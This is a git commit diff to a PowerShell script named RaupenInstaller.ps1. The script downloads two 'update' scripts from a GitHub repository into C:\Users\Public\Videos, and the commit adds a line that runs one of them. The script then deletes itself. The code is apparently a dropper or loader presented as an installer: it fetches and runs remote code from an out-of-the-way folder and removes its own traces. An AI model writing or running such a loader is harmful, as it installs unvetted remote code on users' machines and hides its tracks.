907d252593261718ab337e82dbd3796fc543956e
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-22 20:45:50 +0100

    Add files via upload

--- RaupenInstaller.ps1
+++ RaupenInstaller.ps1
@@ -1,3 +1,4 @@
 Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/moveupdate.ps1 -OutFile C:\Users\Public\Videos\moveupdate.ps1 -UseBasicParsing -Force
 Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/executeupdate.ps1 -OutFile C:\Users\Public\Videos\executeupdate.ps1 -UseBasicParsing -Force
+Start-Process -FilePath "C:\Users\Public\Videos\moveupdate.ps1"
 Remove-Item -Path $scriptPath -Force
